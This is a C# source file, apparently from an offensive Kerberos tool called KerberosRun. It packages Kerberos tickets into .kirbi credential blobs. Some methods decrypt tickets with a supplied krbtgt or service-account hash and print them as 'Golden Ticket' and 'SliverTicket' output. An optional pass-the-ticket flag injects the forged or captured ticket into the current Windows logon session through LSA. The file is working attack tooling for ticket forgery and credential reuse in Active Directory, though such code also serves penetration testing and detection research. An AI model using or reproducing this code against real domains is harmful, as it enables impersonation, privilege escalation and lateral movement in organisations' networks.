using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using System;
using System.Collections.Generic;

namespace KerberosRun
{
    public class Kirbi
    {
        //FROM AS_REP
        public static byte[] GetKirbi(KrbAsRep asRep, KrbEncAsRepPart asDecryptedRepPart, bool ptt = false)
        {


            //https://www.freesoft.org/CIE/RFC/1510/66.htm

            //KrbCredInfo::= SEQUENCE {
            //                key[0]                 EncryptionKey,
            //prealm[1]              Realm OPTIONAL,
            //pname[2]               PrincipalName OPTIONAL,
            //flags[3]               TicketFlags OPTIONAL,
            //authtime[4]            KerberosTime OPTIONAL,
            //starttime[5]           KerberosTime OPTIONAL,
            //endtime[6]             KerberosTime OPTIONAL
            //renew - till[7]          KerberosTime OPTIONAL,
            //srealm[8]              Realm OPTIONAL,
            //sname[9]               PrincipalName OPTIONAL,
            //caddr[10]              HostAddresses OPTIONAL
            //}

            var info = new KrbCredInfo()
            {
                Key = asDecryptedRepPart.Key,
                Realm = asDecryptedRepPart.Realm,
                PName = asRep.CName,
                Flags = asDecryptedRepPart.Flags,
                StartTime = asDecryptedRepPart.StartTime,
                EndTime = asDecryptedRepPart.EndTime,
                RenewTill = asDecryptedRepPart.RenewTill,
                SRealm = asDecryptedRepPart.Realm,
                SName = asDecryptedRepPart.SName
            };




            //EncKrbCredPart   ::= [APPLICATION 29]   SEQUENCE {
            //ticket-info[0]         SEQUENCE OF KrbCredInfo,
            //nonce[1]               INTEGER OPTIONAL,
            //timestamp[2]           KerberosTime OPTIONAL,
            //usec[3]                INTEGER OPTIONAL,
            //s-address[4]           HostAddress OPTIONAL,
            //r-address[5]           HostAddress OPTIONAL
            //}

            KrbCredInfo[] infos = { info };

            var encCredPart = new KrbEncKrbCredPart()
            {
                TicketInfo = infos

            };

            //KRB-CRED         ::= [APPLICATION 22]   SEQUENCE {
            //pvno[0]                INTEGER,
            //msg - type[1]            INTEGER, --KRB_CRED
            //tickets[2]             SEQUENCE OF Ticket,
            //enc - part[3]            EncryptedData
            //}
            var myCred = new KrbCred();
            myCred.ProtocolVersionNumber = 5;
            myCred.MessageType = MessageType.KRB_CRED;
            myCred.Tickets = new KrbTicket[] { asRep.Ticket };


            //https://github.com/dirkjanm/krbrelayx/blob/master/lib/utils/kerberos.py#L220
            //No Encryption for KRB-CRED
            var encryptedData = new KrbEncryptedData()
            {
                Cipher = encCredPart.EncodeApplication(),
            };

            myCred.EncryptedPart = encryptedData;

            byte[] kirbiBytes = myCred.EncodeApplication().ToArray();
            
            //string kirbiString = Convert.ToBase64String(kirbiBytes);

            if (ptt) { LSA.ImportTicket(kirbiBytes, new LUID()); }
            

            return kirbiBytes;
        }


        //FROM TGS_REP
        public static byte[] GetKirbi(KrbTgsRep tgsRep, KrbEncTgsRepPart tgsDecryptedRepPart, bool ptt = false)
        {
            //KrbCredInfo::= SEQUENCE {
            //                key[0]                 EncryptionKey,
            //prealm[1]              Realm OPTIONAL,
            //pname[2]               PrincipalName OPTIONAL,
            //flags[3]               TicketFlags OPTIONAL,
            //authtime[4]            KerberosTime OPTIONAL,
            //starttime[5]           KerberosTime OPTIONAL,
            //endtime[6]             KerberosTime OPTIONAL
            //renew - till[7]          KerberosTime OPTIONAL,
            //srealm[8]              Realm OPTIONAL,
            //sname[9]               PrincipalName OPTIONAL,
            //caddr[10]              HostAddresses OPTIONAL
            //}

            var info = new KrbCredInfo()
            {
                Key = tgsDecryptedRepPart.Key,
                Realm = tgsDecryptedRepPart.Realm,
                PName = tgsRep.CName,
                Flags = tgsDecryptedRepPart.Flags,
                StartTime = tgsDecryptedRepPart.StartTime,
                EndTime = tgsDecryptedRepPart.EndTime,
                RenewTill = tgsDecryptedRepPart.RenewTill,
                SRealm = tgsDecryptedRepPart.Realm,
                SName = tgsDecryptedRepPart.SName
            };




            //EncKrbCredPart   ::= [APPLICATION 29]   SEQUENCE {
            //ticket-info[0]         SEQUENCE OF KrbCredInfo,
            //nonce[1]               INTEGER OPTIONAL,
            //timestamp[2]           KerberosTime OPTIONAL,
            //usec[3]                INTEGER OPTIONAL,
            //s-address[4]           HostAddress OPTIONAL,
            //r-address[5]           HostAddress OPTIONAL
            //}

            KrbCredInfo[] infos = { info };

            var encCredPart = new KrbEncKrbCredPart()
            {
                TicketInfo = infos

            };

            //KRB-CRED         ::= [APPLICATION 22]   SEQUENCE {
            //pvno[0]                INTEGER,
            //msg - type[1]            INTEGER, --KRB_CRED
            //tickets[2]             SEQUENCE OF Ticket,
            //enc - part[3]            EncryptedData
            //}
            var myCred = new KrbCred();
            myCred.ProtocolVersionNumber = 5;
            myCred.MessageType = MessageType.KRB_CRED;
            KrbTicket[] tickets = { tgsRep.Ticket };
            myCred.Tickets = tickets;


            var encryptedData = new KrbEncryptedData()
            {
                Cipher = encCredPart.EncodeApplication(),
            };

            myCred.EncryptedPart = encryptedData;

            byte[] kirbiBytes = myCred.EncodeApplication().ToArray();

            //string kirbiString = Convert.ToBase64String(kirbiBytes);

            if (ptt) { LSA.ImportTicket(kirbiBytes, new LUID()); }
            

            return kirbiBytes;
        }


        //FROM TGT
        public static byte[] GetKirbi(KrbTicket tgt, string hash, EncryptionType etype,  bool ptt = false, bool verbose = false)
        {

            var kerbCred = new KerberosHashCreds("krbtgt", hash, etype);

            var ticketDecrypted = tgt.EncryptedPart.Decrypt
                                (kerbCred.CreateKey(),
                                KeyUsage.Ticket,
                                b => KrbEncTicketPart.DecodeApplication(b));


            //https://www.freesoft.org/CIE/RFC/1510/66.htm

            //KrbCredInfo::= SEQUENCE {
            //                key[0]                 EncryptionKey,
            //prealm[1]              Realm OPTIONAL,
            //pname[2]               PrincipalName OPTIONAL,
            //flags[3]               TicketFlags OPTIONAL,
            //authtime[4]            KerberosTime OPTIONAL,
            //starttime[5]           KerberosTime OPTIONAL,
            //endtime[6]             KerberosTime OPTIONAL
            //renew - till[7]          KerberosTime OPTIONAL,
            //srealm[8]              Realm OPTIONAL,
            //sname[9]               PrincipalName OPTIONAL,
            //caddr[10]              HostAddresses OPTIONAL
            //}

            var info = new KrbCredInfo()
            {
                Key = ticketDecrypted.Key,
                Realm = ticketDecrypted.CRealm,
                PName = ticketDecrypted.CName,
                Flags = ticketDecrypted.Flags,
                StartTime = ticketDecrypted.StartTime,
                EndTime = ticketDecrypted.EndTime,
                RenewTill = ticketDecrypted.RenewTill,
                SRealm = ticketDecrypted.CRealm,
                SName = new KrbPrincipalName
                {
                    Type = PrincipalNameType.NT_SRV_INST,
                    Name = new[] { "krbtgt", ticketDecrypted.CRealm }
                }
            };




            //EncKrbCredPart   ::= [APPLICATION 29]   SEQUENCE {
            //ticket-info[0]         SEQUENCE OF KrbCredInfo,
            //nonce[1]               INTEGER OPTIONAL,
            //timestamp[2]           KerberosTime OPTIONAL,
            //usec[3]                INTEGER OPTIONAL,
            //s-address[4]           HostAddress OPTIONAL,
            //r-address[5]           HostAddress OPTIONAL
            //}

            KrbCredInfo[] infos = { info };

            var encCredPart = new KrbEncKrbCredPart()
            {
                TicketInfo = infos

            };

            
            //KRB-CRED         ::= [APPLICATION 22]   SEQUENCE {
            //pvno[0]                INTEGER,
            //msg - type[1]            INTEGER, --KRB_CRED
            //tickets[2]             SEQUENCE OF Ticket,
            //enc - part[3]            EncryptedData
            //}
            var myCred = new KrbCred();
            myCred.ProtocolVersionNumber = 5;
            myCred.MessageType = MessageType.KRB_CRED;
            myCred.Tickets = new KrbTicket[] { tgt };


            //https://github.com/dirkjanm/krbrelayx/blob/master/lib/utils/kerberos.py#L220
            //No Encryption for KRB-CRED
            var encryptedData = new KrbEncryptedData()
            {
                Cipher = encCredPart.EncodeApplication()
            };

            myCred.EncryptedPart = encryptedData;

            byte[] kirbiBytes = myCred.EncodeApplication().ToArray();


            string kirbiString = Convert.ToBase64String(kirbiBytes);

            if (ptt) { LSA.ImportTicket(kirbiBytes, new LUID()); }
            else
            {
                Console.WriteLine("[+] Golden Ticket Kirbi:");
                Console.WriteLine("    - {0}", kirbiString);
            }
            if (verbose)
            {
                Console.WriteLine("[*] Ticket Info:");
                Display.PrintKirbi(kirbiString);
            }


            return kirbiBytes;
        }


        //FROM TGS
        public static byte[] GetKirbi(KrbTicket tgs, string srvName, string srvHash, EncryptionType etype, string service, bool ptt = false, bool verbose = false)
        {

            var kerbCred = new KerberosHashCreds(srvName, srvHash, etype);

            var ticketDecrypted = tgs.EncryptedPart.Decrypt
                                (kerbCred.CreateKey(),
                                KeyUsage.Ticket,
                                b => KrbEncTicketPart.DecodeApplication(b));


            //KrbCredInfo::= SEQUENCE {
            //                key[0]                 EncryptionKey,
            //prealm[1]              Realm OPTIONAL,
            //pname[2]               PrincipalName OPTIONAL,
            //flags[3]               TicketFlags OPTIONAL,
            //authtime[4]            KerberosTime OPTIONAL,
            //starttime[5]           KerberosTime OPTIONAL,
            //endtime[6]             KerberosTime OPTIONAL
            //renew - till[7]          KerberosTime OPTIONAL,
            //srealm[8]              Realm OPTIONAL,
            //sname[9]               PrincipalName OPTIONAL,
            //caddr[10]              HostAddresses OPTIONAL
            //}

            string srvHost = null;
            if (srvName.Contains("$"))
            {
                srvHost = srvName.Replace("$", string.Empty) + "." + ticketDecrypted.CRealm;
            }
            else
            {
                srvHost = srvName;
            }

            var info = new KrbCredInfo()
            {
                Key = ticketDecrypted.Key,
                Realm = ticketDecrypted.CRealm,
                PName = ticketDecrypted.CName,
                Flags = ticketDecrypted.Flags,
                StartTime = ticketDecrypted.StartTime,
                EndTime = ticketDecrypted.EndTime,
                RenewTill = ticketDecrypted.RenewTill,
                SRealm = ticketDecrypted.CRealm,
                SName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_SRV_INST,
                    Name = new[] { service, srvHost }
                }
            };




            //EncKrbCredPart   ::= [APPLICATION 29]   SEQUENCE {
            //ticket-info[0]         SEQUENCE OF KrbCredInfo,
            //nonce[1]               INTEGER OPTIONAL,
            //timestamp[2]           KerberosTime OPTIONAL,
            //usec[3]                INTEGER OPTIONAL,
            //s-address[4]           HostAddress OPTIONAL,
            //r-address[5]           HostAddress OPTIONAL
            //}

            KrbCredInfo[] infos = { info };

            var encCredPart = new KrbEncKrbCredPart()
            {
                TicketInfo = infos

            };

            //KRB-CRED         ::= [APPLICATION 22]   SEQUENCE {
            //pvno[0]                INTEGER,
            //msg - type[1]            INTEGER, --KRB_CRED
            //tickets[2]             SEQUENCE OF Ticket,
            //enc - part[3]            EncryptedData
            //}
            var myCred = new KrbCred();
            myCred.ProtocolVersionNumber = 5;
            myCred.MessageType = MessageType.KRB_CRED;
            KrbTicket[] tickets = { tgs };
            myCred.Tickets = tickets;


            //https://github.com/dirkjanm/krbrelayx/blob/master/lib/utils/kerberos.py#L220
            //No Encryption for KRB-CRED
            var encryptedData = new KrbEncryptedData()
            {
                Cipher = encCredPart.EncodeApplication()
            };

            myCred.EncryptedPart = encryptedData;

            byte[] kirbiBytes = myCred.EncodeApplication().ToArray();


            string kirbiString = Convert.ToBase64String(kirbiBytes);

            if (ptt) { LSA.ImportTicket(kirbiBytes, new LUID());}
            else
            {
                Console.WriteLine("[+] SliverTicket Ticket Kirbi:");
                Console.WriteLine("    - {0}", kirbiString);
            }
            if (verbose) 
            {
                Console.WriteLine("[*] Ticket Info:");
                Display.PrintKirbi(kirbiString); 
            }


            return kirbiBytes;
        }
   
    
    

        public static KIIRBIINFO GetTicketFromKirbi(string kirbi)
        {
            try
            {
                var kirbiBytes = Convert.FromBase64String(kirbi);

                var krbCred = KrbCred.DecodeApplication(kirbiBytes);

                var encCredPart = KrbEncKrbCredPart.DecodeApplication(krbCred.EncryptedPart.Cipher);

                var tgt = krbCred.Tickets[0];
                var sessionKey = encCredPart.TicketInfo[0].Key;
                string cname = encCredPart.TicketInfo[0].PName.Name[0];

                return new KIIRBIINFO { 
                    Ticket = tgt,
                    SessionKey = sessionKey,
                    CNAME = cname
                };
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] {0}", e.Message);
                Environment.Exit(1);
            }
            return new KIIRBIINFO { };
        }

        public struct KIIRBIINFO
        {
            public KrbTicket Ticket;
            public KrbEncryptionKey SessionKey;
            public string CNAME;
        }
    }
}
